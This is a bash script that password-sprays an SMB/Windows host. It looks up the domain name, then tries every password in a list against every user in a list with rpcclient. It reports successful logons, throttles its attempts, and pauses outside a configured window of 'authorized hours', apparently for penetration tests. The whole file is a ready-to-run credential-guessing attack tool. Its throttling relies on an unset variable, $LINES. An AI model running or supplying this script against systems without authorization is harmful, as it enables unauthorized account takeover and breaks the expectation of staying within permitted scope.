#!/bin/bash

# Set the start and stop times in 24-hour format
START_TIME=$1
STOP_TIME=$2
USERS=$3
PASSWORDS=$4
SLEEP=$5
HOST=$6
RPCCLIENT=$(which rpcclient)
NMBLOOKUP=$(which nmblookup)
DOMAIN="$($NMBLOOKUP -A $HOST | grep GROUP | head -1 | awk '{print $1}')"
# Set the current time
CURRENT_TIME=$(date +%H)

# Loop until the current time is between argument #1 and #2
while [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; do
  # If the current time is outside of the start and stop times, sleep for 5 minutes
  sleep 300
  # Update the current time
  CURRENT_TIME=$(date +%H)
done

# The script will reach this point when the current time is between the authorized hours

# Spray loop
while read PASS; do
    ITR="$((ITR + 1))"
    echo "Current Password:" $PASS
    while read USER; do
        $RPCCLIENT -m="SMB3" -U "${DOMAIN}\\${USER}%${PASS}" "$HOST" -c "getusername; quit" 2>/dev/null
 
        if [[ $? -eq 0 ]]; then
            echo -en "\e[32m[+]\e[0m "
            echo "${DOMAIN}\\${USER}:${PASS} - LOGON SUCCESS at $(date)"
        fi
    done < <(cat "$USERS")
    CURRENT_TIME=$(date +%H)
    if [[ $ITR -lt $LINES ]]; then
        echo -e "\e[33m[+]\e[0m Sleeping ${SLEEP} seconds."
        sleep ${SLEEP}
    fi
    # Check the current time
    if [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; then
        TARGET_DATE=$(date -d "tomorrow $START_TIME" +%s)
        echo "Pausing - outside authorized hours. Will resume spraying again once the system time is back within the authorized hours."
          
        # Update the current time       
        CURRENT_TIME=$(date +%H)
        # Loop until the current time is the target time
        while [[ $(date +%s) -lt $TARGET_DATE ]]; do
            # Sleep for 1 minute
            sleep 60
            # Update the current time
            CURRENT_TIME=$(date +%H)
        done
        # Jump back to the beginning of the spray loop
        continue
    fi
done < <(cat "$PASSWORDS")
